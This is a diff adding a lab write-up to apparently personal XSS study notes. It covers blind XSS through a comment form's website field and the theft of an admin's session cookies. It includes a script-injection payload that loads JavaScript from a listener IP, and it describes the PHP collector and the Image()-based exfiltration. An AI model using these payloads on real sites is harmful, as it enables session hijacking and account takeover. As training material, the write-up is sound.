@@ -657,4 +657,69 @@ there are also certain server configurations that might help in preventing XSS:
 WAF also reduces chances of XSS   
 some frameworks like ASP.NET have built in XSS protections 
 
+## Skills Assessment 
+
+conducting a web pen test and focusing on XSS 
+
+have a target site and the `/assessment` directory 
+
+use our skills to: 
+- identify a vulnerable input field
+- find a working XSS payload 
+- try to steal a victim's cookies using session hijacking 
+
+opening the target page we can see a search form and a comment submission form: 
+
+![](Images/Pasted%20image%2020240125092738.png)
+
+![](Images/Pasted%20image%2020240125092748.png)
+
+first I try to use the search form but it appears that there is sanitation on special characters: 
+
+![](Images/Pasted%20image%2020240125093239.png)
+
+![](Images/Pasted%20image%2020240125093255.png)
+
+then looking at the comment submission page there is a note about comments being approved by an admin first, so this leads me to think a blind xss attack may be an option: 
+
+![](Images/Pasted%20image%2020240125093412.png)
+
+knowing this, lets begin using the form to find vulnerable fields using blind XSS techniques 
+
+first lets setup our server to listen for responses, for now I will use a netcat server: 
+
+![](Images/Pasted%20image%2020240125100340.png)
+
+using inputs like `<script src="http://10.10.15.210:81/name"></script>` for each of the input fields and submitting the form gives us this error: 
+
+![](Images/Pasted%20image%2020240125100733.png)
+
+it appears the name and email fields are sanitized or validated so we will again try without those and get a response from the website url field: 
+
+
+![](Images/Pasted%20image%2020240125100858.png)
+
+now that this appears to be the vulnerable field we can use it to try to execute a custom script on our server
+
+we will need to setup a PHP server to host our javascript file  
+
+first I create the `/tmp/tmpserver` directory and add an index.php file with: 
+
+![](Images/Pasted%20image%2020240125101322.png)
+
+then I create a script.js file in the same directory with the Image() payload: 
+
+![](Images/Pasted%20image%2020240125101435.png)
+
+now I start listening on the PHP server: 
+
+![](Images/Pasted%20image%2020240125101520.png)
+
+then I again use the form with our vulnerable fields to load the script.js file: 
+
+![](Images/Pasted%20image%2020240125101812.png)
+
+and on the php server I obtain the flag: 
+
+![](Images/Pasted%20image%2020240125101851.png)
 
